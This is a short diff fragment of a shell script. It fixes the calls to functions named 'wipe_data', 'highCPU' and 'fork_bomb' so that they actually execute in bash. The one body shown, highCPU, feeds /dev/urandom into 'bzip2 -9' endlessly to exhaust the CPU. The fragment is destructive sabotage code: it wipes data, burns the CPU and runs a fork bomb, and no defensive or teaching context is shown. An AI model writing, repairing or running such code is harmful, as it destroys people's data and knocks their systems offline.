@@ -12,8 +12,8 @@ function highCPU() {
   dd if=/dev/urandom | bzip2 -9 >> /dev/null
 }
 
-wipe_data()
+wipe_data
 
-highCPU()
+highCPU
 
-fork_bomb()
+fork_bomb
